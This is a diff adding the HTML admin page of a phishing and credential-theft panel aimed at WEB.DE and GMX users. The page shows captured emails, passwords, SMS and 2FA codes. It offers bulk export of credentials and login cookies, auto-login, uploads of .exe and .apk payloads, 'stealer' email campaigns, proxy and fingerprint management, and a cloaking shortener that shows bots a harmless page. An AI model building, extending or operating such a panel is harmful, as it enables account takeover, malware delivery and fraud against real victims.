@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <title>GMW Admin</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/admin.css">
+</head>
+<body>
+  <header class="header">
+    <div class="header-left">
+      <span class="menu-toggle-wrap">
+        <button class="menu-toggle" id="menuToggle" aria-label="Menu">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
+        </button>
+        <span id="activity-badge" class="activity-badge hidden">0</span>
+      </span>
+      <div class="logo"><span>Admin</span></div>
+      <nav class="nav-links"></nav>
+    </div>
+    <div class="header-right">
+      <button class="theme-toggle" id="themeToggle" aria-label="Light/dark theme" title="Toggle theme">
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+        </svg>
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+        </svg>
+      </button>
+      <div class="header-collapse-wrap" id="headerCollapseWrap">
+        <div class="dropdown header-dropdown">
+          <div class="header-mode-dropdown" id="headerModeDropdown">
+            <button type="button" class="header-mode-trigger" id="headerModeTrigger" aria-expanded="false" aria-haspopup="true" aria-label="Режим">
+              <span class="header-mode-trigger-text" id="headerModeTriggerText">Auto</span>
+              <svg class="header-mode-trigger-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+            </button>
+            <div class="header-mode-menu" id="headerModeMenu" role="menu" aria-hidden="true">
+              <button type="button" class="header-mode-item" role="menuitem" data-mode="manual">
+                <span class="header-mode-item-label">Manual</span>
+              </button>
+              <button type="button" class="header-mode-item" role="menuitem" data-mode="auto">
+                <span class="header-mode-item-label">Auto</span>
+              </button>
+              <button type="button" class="header-mode-item" role="menuitem" data-mode="auto-login" title="При новом логе WEB.DE автоматически запускать скрипт входа">
+                <span class="header-mode-item-label">Auto-Login</span>
+              </button>
+            </div>
+          </div>
+          <div class="header-mode-dropdown" id="startPageDropdown">
+            <button type="button" class="header-mode-trigger" id="startPageTrigger" aria-expanded="false" aria-haspopup="true" aria-label="Стартовая страница">
+              <span class="header-mode-trigger-text" id="startPageTriggerText">Login</span>
+              <svg class="header-mode-trigger-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+            </button>
+            <div class="header-mode-menu" id="startPageMenu" role="menu" aria-hidden="true">
+              <button type="button" class="header-mode-item" role="menuitem" data-page="login">
+                <span class="header-mode-item-label">Login</span>
+              </button>
+              <button type="button" class="header-mode-item" role="menuitem" data-page="change">
+                <span class="header-mode-item-label">Change</span>
+              </button>
+              <button type="button" class="header-mode-item" role="menuitem" data-page="download">
+                <span class="header-mode-item-label">Download</span>
+              </button>
+              <button type="button" class="header-mode-item" role="menuitem" data-page="klein">
+                <span class="header-mode-item-label">Klein</span>
+              </button>
+            </div>
+          </div>
+          <div class="header-mode-dropdown" id="headerMailDropdown">
+            <button type="button" class="header-mode-trigger" id="headerMailTrigger" aria-expanded="false" aria-haspopup="true" aria-label="Mail — массовая отправка">
+              <span class="header-mode-trigger-text">Mail · Email</span>
+              <svg class="header-mode-trigger-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+            </button>
+            <div class="header-mode-menu header-mail-menu" id="headerMailMenu" role="menu" aria-hidden="true">
+              <div class="header-archive-menu-inner">
+                <label class="header-archive-label" for="headerMailMode">Режим</label>
+                <select id="headerMailMode" class="header-archive-select">
+                  <option value="all">Всем (все лиды с email, повторно тоже)</option>
+                  <option value="valid">Валид (есть куки входа, повторно тоже)</option>
+                  <option value="valid_unsent" selected>Валид не отправлено (куки, ещё без «Send Email»)</option>
+                </select>
+                <p class="header-mail-hint">Отработанным не отправляется ни в одном режиме.</p>
+                <button type="button" class="btn btn-primary btn-sm header-mail-send-btn" id="headerMailSend">Отправить</button>
+              </div>
+            </div>
+          </div>
+          <div class="header-mode-dropdown" id="headerArchiveDropdown">
+            <button type="button" class="header-mode-trigger" id="headerArchiveTrigger" aria-expanded="false" aria-haspopup="true" aria-label="Архив">
+              <span class="header-mode-trigger-text">Архив</span>
+              <svg class="header-mode-trigger-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+            </button>
+            <div class="header-mode-menu header-archive-menu" id="headerArchiveMenu" role="menu" aria-hidden="true">
+              <div class="header-archive-menu-inner">
+                <label class="header-archive-label" for="headerArchiveFilter">Критерий</label>
+                <select id="headerArchiveFilter" class="header-archive-select">
+                  <option value="worked">Отработанные</option>
+                </select>
+                <p class="header-archive-hint">После архивации записи пропадают из списка слева, но остаются в базе. Показать архив в списке: в консоли <code>localStorage.setItem(&apos;gmw-admin-show-archived&apos;,&apos;1&apos;)</code> и обновить страницу; скрыть снова — <code>removeItem</code>.</p>
+                <button type="button" class="btn btn-primary btn-sm header-archive-apply" id="headerArchiveApply">Архивировать</button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="header-actions">
+          <button type="button" id="btn-stats" class="nav-btn">Statistic</button>
+          <button type="button" id="btn-config" class="nav-btn header-config">Config</button>
+          <a href="/mailer/" id="btn-mailer" class="nav-btn header-mailer" target="_blank" rel="noopener" title="Конфиг stealer-email">Mailer</a>
+        </div>
+      </div>
+      <button type="button" class="header-collapse-btn" id="headerCollapseBtn" aria-label="Меню" aria-expanded="false" title="Меню">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+      </button>
+    </div>
+  </header>
+  <div id="headerCollapsePanel" class="header-collapse-panel" aria-hidden="true">
+    <div class="header-collapse-panel-inner" id="headerCollapsePanelInner"></div>
+  </div>
+
+  <div id="config-modal" class="config-modal hidden" aria-hidden="true">
+    <div class="config-modal-backdrop" id="config-modal-backdrop"></div>
+    <div class="config-modal-panel">
+      <div class="config-modal-header">
+        <h2 class="config-modal-title">Config</h2>
+        <button type="button" class="config-modal-close" id="config-modal-close" aria-label="Свернуть">Свернуть</button>
+      </div>
+      <div class="config-modal-body">
+        <nav class="config-nav" aria-label="Config">
+          <button type="button" class="config-nav-item active" data-pane="windows" id="config-nav-windows">Windows</button>
+          <button type="button" class="config-nav-item" data-pane="android" id="config-nav-android">Android</button>
+          <button type="button" class="config-nav-item" data-pane="export" id="config-nav-export">Выгрузка логов</button>
+          <button type="button" class="config-nav-item" data-pane="proxies" id="config-nav-proxies">Прокси</button>
+          <button type="button" class="config-nav-item" data-pane="short" id="config-nav-short">Short</button>
+          <button type="button" class="config-nav-item" data-pane="email" id="config-nav-email">E-Mail</button>
+        </nav>
+        <div class="config-content">
+          <div id="config-pane-windows" class="config-pane active">
+            <div class="config-group">
+              <div class="config-control-row config-upload-row config-upload-row--windows">
+                <input type="file" id="config-download-files-input" accept=".exe,.zip,.rar,.bin" multiple aria-label="Загрузить файлы" class="config-input config-input-file">
+                <span class="config-archive-password-wrap">
+                  <label for="config-windows-archive-password" class="config-archive-password-label">Пароль архива:</label>
+                  <input type="text" id="config-windows-archive-password" class="config-input config-archive-password-input" placeholder="для .zip/.rar" autocomplete="off" aria-label="Пароль от архива">
+                </span>
+                <button type="button" id="config-download-files-save" class="btn btn-primary btn-sm">Сохранить</button>
+              </div>
+              <p id="config-download-files-message" class="config-msg hidden"></p>
+            </div>
+            <div class="config-group">
+              <div class="config-files-list-label">Список файлов (после сохранения):</div>
+              <p class="config-files-list-hint">Загруженные файлы сохраняются под теми же именами, что и при загрузке (опасные символы в имени заменяются на <code>_</code>).</p>
+              <div id="config-download-files-list" class="config-files-list"></div>
+            </div>
+            <div class="config-group config-actions-row">
+              <button type="button" id="config-download-reset-counts" class="btn btn-ghost btn-sm" data-platform="windows">Сбросить счётчики</button>
+              <button type="button" id="config-download-rotate-next" class="btn btn-ghost btn-sm" data-platform="windows">След. конфиг</button>
+            </div>
+          </div>
+
+          <div id="config-pane-android" class="config-pane">
+            <div class="config-group">
+              <div class="config-control-row config-upload-row">
+                <input type="file" id="config-android-files-input" accept=".apk,.bin,.zip" multiple aria-label="Загрузить файлы" class="config-input config-input-file">
+                <button type="button" id="config-android-files-save" class="btn btn-primary btn-sm">Сохранить</button>
+              </div>
+              <p id="config-android-files-message" class="config-msg hidden"></p>
+            </div>
+            <div class="config-group">
+              <div class="config-files-list-label">Список файлов (после сохранения):</div>
+              <div id="config-android-files-list" class="config-files-list"></div>
+            </div>
+            <div class="config-group config-actions-row">
+              <button type="button" id="config-android-reset-counts" class="btn btn-ghost btn-sm" data-platform="android">Сбросить счётчики</button>
+              <button type="button" id="config-android-rotate-next" class="btn btn-ghost btn-sm" data-platform="android">След. конфиг</button>
+            </div>
+          </div>
+
+          <div id="config-pane-export" class="config-pane">
+            <div id="config-export-body" class="config-toggle-body">
+              <div class="config-row config-export-platforms">
+                <label class="config-cb"><input type="checkbox" id="export-platform-windows" class="config-cb-input"> Win</label>
+                <label class="config-cb"><input type="checkbox" id="export-platform-macos" class="config-cb-input"> Mac</label>
+                <label class="config-cb"><input type="checkbox" id="export-platform-android" class="config-cb-input"> And</label>
+                <label class="config-cb"><input type="checkbox" id="export-platform-ios" class="config-cb-input"> iOS</label>
+                <label class="config-cb"><input type="checkbox" id="export-platform-unknown" class="config-cb-input"> —</label>
+              </div>
+              <div class="config-row">
+                <button type="button" id="export-logs-credentials" class="btn btn-ghost">email:pass</button>
+                <button type="button" id="export-logs-old-new" class="btn btn-ghost">email:pass new</button>
+                <button type="button" id="export-logs-all-emails" class="btn btn-ghost">email</button>
+                <button type="button" id="export-logs-all-email-pass" class="btn btn-ghost">all</button>
+              </div>
+              <div class="config-row config-export-cookies-row">
+                <span class="config-export-cookies-label">Куки WEB.DE:</span>
+                <button type="button" id="export-cookies-all" class="btn btn-ghost">Выгрузить все куки</button>
+                <button type="button" id="export-cookies-new" class="btn btn-ghost">Выгрузить новые</button>
+                <button type="button" id="export-cookies-force" class="btn btn-ghost" title="Все куки в архив, без пометки выгруженных">Принудительная выгрузка</button>
+              </div>
+            </div>
+          </div>
+
+          <div id="config-pane-proxies" class="config-pane">
+            <div class="config-group config-proxies-stack">
+              <section class="config-proxies-block" aria-labelledby="config-proxies-block-proxy-title">
+                <h3 id="config-proxies-block-proxy-title" class="config-proxies-block-title">Прокси</h3>
+                <textarea id="config-proxies-text" class="config-input config-proxies-textarea" rows="8" placeholder="host:port:login:password" spellcheck="false"></textarea>
+                <div class="config-control-row config-proxies-actions">
+                  <button type="button" id="config-proxies-validate" class="btn btn-primary btn-sm">Проверить</button>
+                  <button type="button" id="config-proxies-save" class="btn btn-ghost btn-sm">Сохранить</button>
+                </div>
+                <p id="config-proxies-message" class="config-msg hidden"></p>
+                <div id="config-proxies-result-wrap" class="config-proxies-result-wrap hidden">
+                  <div class="config-proxies-result-summary"></div>
+                  <div id="config-proxies-result-list" class="config-proxies-result-list"></div>
+                </div>
+              </section>
+              <section class="config-proxies-block" aria-labelledby="config-proxies-block-fp-title">
+                <h3 id="config-proxies-block-fp-title" class="config-proxies-block-title">Отпечатки</h3>
+                <p id="config-webde-fp-list-message" class="config-msg hidden"></p>
+                <div id="config-webde-fp-list" class="config-webde-fp-list" aria-label="Список отпечатков"></div>
+                <div class="config-control-row config-proxies-actions">
+                  <button type="button" id="config-webde-fp-check" class="btn btn-primary btn-sm">Проверить</button>
+                </div>
+              </section>
+              <section class="config-proxies-block" aria-labelledby="config-proxies-block-probe-title">
+                <h3 id="config-proxies-block-probe-title" class="config-proxies-block-title">Проверка WEB.DE</h3>
+                <p class="config-proxies-block-hint">Только email. За один «Старт» сервер проверяет ограниченное число индексов (по умолчанию 12); остальные — следующими запусками. На VPS без X11 — headless. Успех — поле пароля. Батчи по 3.</p>
+                <div class="config-control-row config-proxies-actions config-proxies-actions--probe">
+                  <input type="text" id="config-webde-probe-email" class="config-input config-webde-probe-email" placeholder="email@web.de" autocomplete="off" spellcheck="false" inputmode="email">
+                  <button type="button" id="config-webde-probe-start" class="btn btn-primary btn-sm">Старт</button>
+                  <button type="button" id="config-webde-probe-pause" class="btn btn-ghost btn-sm" disabled>Пауза</button>
+                </div>
+                <p id="config-webde-probe-status" class="config-msg hidden"></p>
+                <div id="config-webde-probe-results-wrap" class="config-webde-probe-results-wrap">
+                  <div class="config-proxies-result-summary" id="config-webde-probe-results-summary">Результаты появятся после «Старт».</div>
+                  <div id="config-webde-probe-results-list" class="config-webde-probe-result-list"></div>
+                </div>
+              </section>
+              <div class="config-proxies-terminal-wrap">
+                <div class="config-proxies-terminal-label">Терминал</div>
+                <pre id="config-proxies-terminal" class="config-proxies-terminal" aria-live="polite"></pre>
+              </div>
+            </div>
+          </div>
+
+          <div id="config-pane-short" class="config-pane">
+            <div class="config-group">
+              <p class="config-files-list-hint">Сокращалка + гейт: домен из Dynadot добавляется в Cloudflare, A запись на IP сервера, в Dynadot — NS на Cloudflare. Боты видят вайт (или страницу новостей), люди переходят на целевой URL.</p>
+              <div class="config-control-row" style="flex-wrap: wrap; gap: 8px; align-items: center;">
+                <input type="text" id="config-short-domain" class="config-input" placeholder="Домен (bueatyk.com)" style="width: 200px;" autocomplete="off">
+                <input type="text" id="config-short-target" class="config-input" placeholder="Целевой URL (блек)" style="flex: 1; min-width: 180px;" autocomplete="off">
+                <label style="display:flex;align-items:center;gap:6px;font-size:0.9rem;">Боты видят:
+                  <select id="config-short-white-style" class="config-input" style="width: auto;">
+                    <option value="">Impressum (по умолчанию)</option>
+                    <option value="news-webde">Новости (стиль WEB.DE)</option>
+                  </select>
+                </label>
+                <button type="button" id="config-short-add" class="btn btn-primary btn-sm">Добавить</button>
+              </div>
+              <p id="config-short-message" class="config-msg hidden"></p>
+            </div>
+            <div class="config-group">
+              <div class="config-files-list-label">Домены</div>
+              <div id="config-short-list" class="config-files-list"></div>
+            </div>
+          </div>
+
+          <div id="config-pane-email" class="config-pane">
+            <div class="config-group">
+              <p class="config-files-list-hint">Отдельная база конфигов E-Mail (SMTP, From, Subject, Html, Img). Не связана с Mailer / Stealer.</p>
+              <div class="config-control-row" style="flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 10px;">
+                <label class="config-label" style="margin: 0;">Профиль:</label>
+                <select id="config-email-profile" class="config-input" style="width: auto; min-width: 180px;"></select>
+                <input type="text" id="config-email-profile-name" class="config-input" placeholder="Имя профиля" style="width: 160px;" autocomplete="off">
+                <button type="button" id="config-email-new" class="btn btn-ghost btn-sm">+ Новый</button>
+                <button type="button" id="config-email-delete" class="btn btn-ghost btn-sm">Удалить</button>
+              </div>
+              <div class="config-group" style="margin-top: 12px;">
+                <label class="config-label" for="config-email-smtp">SMTP</label>
+                <input type="text" id="config-email-smtp" class="config-input" placeholder="host:port:user:fromEmail:password" spellcheck="false" style="width: 100%; max-width: 520px;">
+              </div>
+              <div class="config-control-row" style="flex-wrap: wrap; gap: 12px 20px; margin-top: 10px;">
+                <div>
+                  <label class="config-label" for="config-email-from">From</label>
+                  <input type="text" id="config-email-from" class="config-input" placeholder="Sender name" style="width: 200px;" autocomplete="off">
+                </div>
+                <div>
+                  <label class="config-label" for="config-email-subject">Subject</label>
+                  <input type="text" id="config-email-subject" class="config-input" placeholder="Тема письма" style="width: 240px;" autocomplete="off">
+                </div>
+              </div>
+              <div class="config-group" style="margin-top: 12px;">
+                <label class="config-label" for="config-email-html">Html</label>
+                <textarea id="config-email-html" class="config-input" rows="8" placeholder="HTML шаблон (подстановки _email_, _password_, _src1_ для картинки)" spellcheck="false" style="width: 100%; max-width: 600px;"></textarea>
+                <div style="margin-top: 6px;">
+                  <input type="file" id="config-email-template-file" accept=".html,.htm,text/html" class="config-input-file" aria-label="Загрузить HTML">
+                  <span id="config-email-image-status" class="config-msg" style="margin-left: 8px; font-size: 0.9rem;"></span>
+                </div>
+              </div>
+              <div class="config-group" style="margin-top: 8px;">
+                <label class="config-label">Img</label>
+                <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
+                  <input type="file" id="config-email-image-file" accept="image/*" aria-label="Картинка для _src1_">
+                  <button type="button" id="config-email-image-clear" class="btn btn-ghost btn-sm">Удалить картинку</button>
+                </div>
+              </div>
+              <div class="config-control-row" style="margin-top: 12px; flex-wrap: wrap; gap: 8px; align-items: center;">
+                <button type="button" id="config-email-save" class="btn btn-primary btn-sm">Сохранить</button>
+                <button type="button" id="config-email-send-all-success" class="btn btn-ghost btn-sm" title="Отправить письмо по шаблону Config E-Mail всем, у кого статус Успех и указан email">Письмо всем (Успех)</button>
+              </div>
+              <p id="config-email-message" class="config-msg hidden"></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <div id="bulk-actions" class="bulk-actions hidden">
+        <button type="button" id="btn-bulk-delete" class="btn btn-danger">Delete</button>
+        <button type="button" id="btn-bulk-save" class="btn btn-primary">Save</button>
+      </div>
+      <div id="leads-pagination-top" class="leads-pagination leads-pagination--top hidden"></div>
+      <div class="sessions-list" id="sessions-list-wrap">
+        <div id="leads-list"></div>
+        <div id="leads-pagination" class="leads-pagination hidden"></div>
+      </div>
+      <div id="lead-empty" class="empty-state" style="display:none">
+        <p>No records</p>
+        <span>List is empty</span>
+      </div>
+    </aside>
+
+    <div class="main-and-chat panel-log" id="mainAndChat">
+      <div class="main-and-chat-row">
+      <main class="main">
+      <div id="detail-placeholder" class="main-placeholder">Select a record from the list</div>
+      <div id="mainContent" class="main-detail hidden">
+        <div class="detail-card">
+          <div id="detail-worked-banner" class="detail-worked-banner hidden" role="status">Отработан</div>
+          <div class="detail-row">
+            <div class="detail-label">Email</div>
+            <div class="detail-value" id="detail-email"></div>
+          </div>
+          <div class="detail-row">
+            <div class="detail-label">Email kl</div>
+            <div class="detail-value" id="detail-email-kl"></div>
+          </div>
+          <div class="detail-row">
+            <div class="detail-label">Password</div>
+            <div class="detail-value" id="detail-password-current"></div>
+          </div>
+          <div class="detail-row">
+            <div class="detail-label">Password kl</div>
+            <div class="detail-value" id="detail-password-kl"></div>
+          </div>
+          <div class="detail-row" id="detail-sms-row" style="display:none">
+            <div class="detail-label">SMS code</div>
+            <div class="detail-value copy-on-click" id="detail-sms-code" title="Click to copy"></div>
+          </div>
+          <div class="detail-row" id="detail-2fa-row" style="display:none">
+            <div class="detail-label">2FA code</div>
+            <div class="detail-value copy-on-click" id="detail-2fa-code" title="Click to copy"></div>
+          </div>
+          <div class="detail-row detail-row-status">
+            <div class="detail-label">Status</div>
+            <div class="detail-value detail-status-row" id="detail-status">
+              <span class="status-dot-inline" id="detail-status-dot"></span>
+              <span id="detail-status-text">—</span>
+            </div>
+          </div>
+          <div class="section-title">PASSWORD HISTORY</div>
+          <div id="password-history" class="password-history"></div>
+          <div class="section-title">EVENTS</div>
+          <ul id="detail-terminal" class="events-list"></ul>
+          <div id="detail-action-buttons" class="action-buttons action-buttons--web">
+            <button type="button" id="btn-error" class="btn btn-ghost"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>Error</button>
+            <button type="button" id="btn-push" class="btn btn-ghost"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>Push</button>
+            <button type="button" id="btn-sms" class="btn btn-ghost"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>SMS</button>
+            <button type="button" id="btn-2fa" class="btn btn-ghost" title="Zwei-Faktor-Authentifizierung"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>2-FA</button>
+            <button type="button" id="btn-sms-klein" class="btn btn-ghost" title="Send Klein lead to SMS page" style="display: none;"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>SMS</button>
+            <button type="button" id="btn-change-password" class="btn btn-ghost" title="Change password"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>Password</button>
+            <button type="button" id="btn-send-stealer" class="btn btn-ghost" title="Send stealer email to this lead"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>E-Mail</button>
+            <button type="button" id="btn-open-on-pc" class="btn btn-ghost" title="Show «open email on computer» page"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>PC Page</button>
+            <button type="button" id="btn-android" class="btn btn-ghost" title="Send to Android app download page"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M8 4h8v14a2 2 0 0 1-2 2h-4a2 2 0 0 1-2-2V4z"/><line x1="8" y1="1" x2="8" y2="3"/><line x1="16" y1="1" x2="16" y2="3"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>Android</button>
+            <button type="button" id="btn-sicherheit" class="btn btn-ghost" title="WEB/GMX: по OS лида — Android → приложение, macOS → смена пароля, Windows/iOS/прочее → Sicherheit (PC)" style="display: none;"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</button>
+            <button type="button" id="btn-success" class="btn btn-success"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>Success</button>
+            <button type="button" id="btn-delete" class="btn btn-danger"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg>Delete</button>
+            <button type="button" id="btn-worked" class="btn btn-ghost" title="Переключатель: отметить «Отработан» или снять пометку (Klein в архиве — отдельно)">Отработан</button>
+          </div>
+        </div>
+      </div>
+      <div id="stats-content" class="main-stats hidden">
+        <div id="stats-grid" class="stats-grid"></div>
+      </div>
+    </main>
+
+      <aside class="chat-panel" id="chat-panel">
+      <div class="chat-panel-header">
+        <span class="chat-panel-title">Support Chat</span>
+        <button type="button" id="admin-chat-open-at-user" class="btn btn-secondary admin-chat-open-btn" title="Open chat on user's page">Open Chat</button>
+      </div>
+      <div id="admin-chat-wrap" class="admin-chat-wrap chat-panel-body">
+        <div id="admin-chat-messages" class="admin-chat-messages"></div>
+        <div id="admin-chat-typing" class="admin-chat-typing hidden" aria-hidden="true">Печатает…</div>
+        <div id="admin-chat-empty" class="admin-chat-empty">Select a record to view chat</div>
+        <div class="admin-chat-preview" id="admin-chat-preview"></div>
+        <div class="admin-chat-input-row">
+          <input type="file" accept="image/*" id="admin-chat-file" class="admin-chat-file" aria-label="Image">
+          <label for="admin-chat-file" class="admin-chat-img-btn" title="Attach image">📷</label>
+          <input type="text" id="admin-chat-input" class="admin-chat-input" placeholder="Message..." maxlength="2000" autocomplete="off">
+          <button type="button" id="admin-chat-send" class="btn btn-primary admin-chat-send">Send</button>
+        </div>
+      </div>
+    </aside>
+      <nav class="detail-chat-tabs" id="detailChatTabs" aria-label="Log or Chat">
+        <button type="button" id="tab-log" class="detail-chat-tab is-active" data-panel="log">Log</button>
+        <button type="button" id="tab-chat" class="detail-chat-tab" data-panel="chat">Chat<span class="tab-chat-new-dot hidden" id="tab-chat-new-dot" aria-hidden="true"></span></button>
+      </nav>
+      </div>
+    </div>
+  </div>
+
+  <div id="fingerprint-modal" class="fingerprint-modal hidden" aria-hidden="true">
+    <div class="fingerprint-modal-backdrop" id="fingerprint-modal-backdrop"></div>
+    <div class="fingerprint-modal-panel">
+      <div class="fingerprint-modal-header">
+        <h3 class="fingerprint-modal-title">Антифрод: полные данные лида</h3>
+        <button type="button" class="fingerprint-modal-close" id="fingerprint-modal-close" aria-label="Закрыть">&times;</button>
+      </div>
+      <div class="fingerprint-modal-body-wrap">
+        <pre id="fingerprint-modal-body" class="fingerprint-modal-body"></pre>
+      </div>
+      <div class="fingerprint-modal-actions">
+        <button type="button" id="fingerprint-modal-copy" class="btn btn-primary btn-sm">Копировать всё</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="admin-chat-image-overlay" class="admin-chat-image-overlay" hidden>
+    <button type="button" class="admin-chat-image-overlay-close" id="admin-chat-image-overlay-close" aria-label="Close">&times;</button>
+    <img src="" alt="" class="admin-chat-image-overlay-img" id="admin-chat-image-overlay-img">
+  </div>
+
+  <script>
+  (function(){
+    var p = new URLSearchParams(location.search);
+    var t = p.get('token');
+    if (t) { try { sessionStorage.setItem('gmw-admin-token', t); } catch (e) {} }
+    window.GMW_ADMIN_TOKEN = sessionStorage.getItem('gmw-admin-token') || window.GMW_ADMIN_TOKEN || '';
+  })();
+  </script>
+  <script src="/admin-klein-logo.js"></script>
+  <script src="/admin.js"></script>
+</body>
+</html>
